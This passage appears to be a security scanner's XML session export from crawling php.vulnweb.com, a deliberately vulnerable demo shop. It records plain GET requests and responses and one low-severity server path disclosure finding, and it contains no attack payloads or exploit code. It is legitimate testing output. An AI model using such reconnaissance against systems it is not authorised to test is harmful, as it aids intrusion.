<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:46:53 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>4732</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="181D133EFA654D97CBA7C796FEAB7364"><URL>http://php.vulnweb.com:80/AJAX/infoartist.php?id=2</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="181D133EFA654D97CBA7C796FEAB7364"><![CDATA[GET /AJAX/infoartist.php?id=2 HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/index.php
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: ScriptEngine="Gecko";Category="Crawl";SID="181D133EFA654D97CBA7C796FEAB7364";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="94c3dd2d";
X-Request-Memo: ID="cac17cd5";sc="1";tid="54";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:32 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/xml;charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 1285

<iteminfo><name>Blad3</name><description>&lt;p&gt;
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.
Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a
mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad
litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.
Mauris magna eros, semper a, tempor et, rutrum et, tortor.
&lt;/p&gt;
&lt;p&gt;
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.
Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a
mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad
litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.
Mauris magna eros, semper a, tempor et, rutrum et, tortor.
&lt;/p&gt;</description></iteminfo>
]]></RawResponse><Request id="181D133EFA654D97CBA7C796FEAB7364"><Method>GET</Method><Path>/AJAX/</Path><File>infoartist</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>id=2</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>id</Name><Value>2</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/AJAX/index.php</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Accept-Language</Name><Value>en-US,en;q=0.5</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>ScriptEngine="Gecko";Category="Crawl";SID="181D133EFA654D97CBA7C796FEAB7364";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="94c3dd2d";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="cac17cd5";sc="1";tid="54";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<iteminfo><name>Blad3</name><description>&lt;p&gt;
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.
Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a
mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad
litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.
Mauris magna eros, semper a, tempor et, rutrum et, tortor.
&lt;/p&gt;
&lt;p&gt;
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.
Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a
mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad
litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.
Mauris magna eros, semper a, tempor et, rutrum et, tortor.
&lt;/p&gt;</description></iteminfo>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:32 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/xml;charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>1285</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="DFFD46A7DFB364CD49AE94CB85E0CE16"><URL>http://php.vulnweb.com:80/AJAX/infoartist.php?id=3</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="DFFD46A7DFB364CD49AE94CB85E0CE16"><![CDATA[GET /AJAX/infoartist.php?id=3 HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/index.php
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: ScriptEngine="Gecko";Category="Crawl";SID="DFFD46A7DFB364CD49AE94CB85E0CE16";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="8a3e94a8";
X-Request-Memo: ID="23521c0a";sc="1";tid="54";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:33 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/xml;charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 1285

<iteminfo><name>lyzae</name><description>&lt;p&gt;
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.
Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a
mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad
litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.
Mauris magna eros, semper a, tempor et, rutrum et, tortor.
&lt;/p&gt;
&lt;p&gt;
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.
Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a
mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad
litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.
Mauris magna eros, semper a, tempor et, rutrum et, tortor.
&lt;/p&gt;</description></iteminfo>
]]></RawResponse><Request id="DFFD46A7DFB364CD49AE94CB85E0CE16"><Method>GET</Method><Path>/AJAX/</Path><File>infoartist</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>id=3</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>id</Name><Value>3</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/AJAX/index.php</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Accept-Language</Name><Value>en-US,en;q=0.5</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>ScriptEngine="Gecko";Category="Crawl";SID="DFFD46A7DFB364CD49AE94CB85E0CE16";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="8a3e94a8";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="23521c0a";sc="1";tid="54";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<iteminfo><name>lyzae</name><description>&lt;p&gt;
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.
Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a
mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad
litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.
Mauris magna eros, semper a, tempor et, rutrum et, tortor.
&lt;/p&gt;
&lt;p&gt;
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.
Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a
mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad
litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.
Mauris magna eros, semper a, tempor et, rutrum et, tortor.
&lt;/p&gt;</description></iteminfo>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:33 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/xml;charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>1285</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="295B6DAD0F675DF24CD1151EB8865842"><URL>http://php.vulnweb.com:80/AJAX/categories.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="295B6DAD0F675DF24CD1151EB8865842"><![CDATA[GET /AJAX/categories.php HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/index.php
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: ScriptEngine="Gecko";Category="Crawl";SID="295B6DAD0F675DF24CD1151EB8865842";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="3719a083";
X-Request-Memo: ID="307e1085";sc="1";tid="54";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:33 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/xml;charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 195

<items><item name="infocateg" id="1">Posters</item><item name="infocateg" id="2">Paintings</item><item name="infocateg" id="3">Stickers</item><item name="infocateg" id="4">Graffity</item></items>]]></RawResponse><Request id="295B6DAD0F675DF24CD1151EB8865842"><Method>GET</Method><Path>/AJAX/</Path><File>categories</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/AJAX/index.php</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Accept-Language</Name><Value>en-US,en;q=0.5</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>ScriptEngine="Gecko";Category="Crawl";SID="295B6DAD0F675DF24CD1151EB8865842";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="3719a083";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="307e1085";sc="1";tid="54";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<items><item name="infocateg" id="1">Posters</item><item name="infocateg" id="2">Paintings</item><item name="infocateg" id="3">Stickers</item><item name="infocateg" id="4">Graffity</item></items>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:33 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/xml;charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>195</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="BB30196EC65EB75168A17D0D0779CF08"><URL>http://php.vulnweb.com:80/userinfo.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="BB30196EC65EB75168A17D0D0779CF08"><![CDATA[GET /userinfo.php HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="BB30196EC65EB75168A17D0D0779CF08";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="66";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="6b268ab0";
X-Request-Memo: ID="8eea68e7";sc="1";tid="35";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 302 Found
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:34 GMT
Server: nginx/1.19.0
Location: login.php
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 14

you must login]]></RawResponse><Request id="BB30196EC65EB75168A17D0D0779CF08"><Method>GET</Method><Path>/</Path><File>userinfo</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="BB30196EC65EB75168A17D0D0779CF08";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="66";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="6b268ab0";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="8eea68e7";sc="1";tid="35";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>302</StatusCode><StatusDescription>Found</StatusDescription><SetCookie /><ResponseBody><![CDATA[you must login]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:34 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Location</Name><Value>login.php</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>14</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="80E3ABD0AC82CA4800C74AC685B13410"><URL>http://php.vulnweb.com:80/AJAX/infocateg.php?id=1</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="80E3ABD0AC82CA4800C74AC685B13410"><![CDATA[GET /AJAX/infocateg.php?id=1 HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/index.php
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: ScriptEngine="Gecko";Category="Crawl";SID="80E3ABD0AC82CA4800C74AC685B13410";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="8046e456";
X-Request-Memo: ID="cde704ef";sc="1";tid="54";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:34 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/xml;charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 323

<iteminfo><name>Posters</name><description>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
    Cras venenati</description></iteminfo>]]></RawResponse><Request id="80E3ABD0AC82CA4800C74AC685B13410"><Method>GET</Method><Path>/AJAX/</Path><File>infocateg</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>id=1</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>id</Name><Value>1</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/AJAX/index.php</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Accept-Language</Name><Value>en-US,en;q=0.5</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>ScriptEngine="Gecko";Category="Crawl";SID="80E3ABD0AC82CA4800C74AC685B13410";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="8046e456";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="cde704ef";sc="1";tid="54";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<iteminfo><name>Posters</name><description>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
    Cras venenati</description></iteminfo>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:34 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/xml;charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>323</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="A19962DA6C0E82DFC2D5D2B40FF01C50"><URL>http://php.vulnweb.com:80/AJAX/infocateg.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="84b4cf13-e174-4a0f-8f77-a8d7beb56ac8"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>CUSTOM</EngineType><AttackHTTPRequest /><VulnerabilityID>810</VulnerabilityID><Severity>1</Severity><Name>Possible Server Path Disclosure (unix)</Name><Classifications><Classification kind="CWE" identifier="CWE-209" href="http://cwe.mitre.org/data/definitions/209.html">CWE-209: Information Exposure Through an Error Message</Classification><Classification kind="7PK" identifier="Errors" href="https://vulncat.fortify.com/">Errors</Classification><Classification kind="7PK Category" identifier="Poor Error Handling: Unhandled Exception" href="https://vulncat.fortify.com/">Poor Error Handling: Unhandled Exception</Classification></Classifications><DetectionSelection><Location offset="375" length="27" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[A minor vulnerability has been discovered within your web application due to the the presence of a fully qualified path name to the root of your system. This most often occurs in context of an error being produced by the web application. Fully qualified server path names allow an attacker to know the file system structure of the web server, which is a baseline for many other types of attacks to be successful. Recommendations include adopting a consistent error handling scheme and mechanism that prevents fully qualified path names from being displayed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText 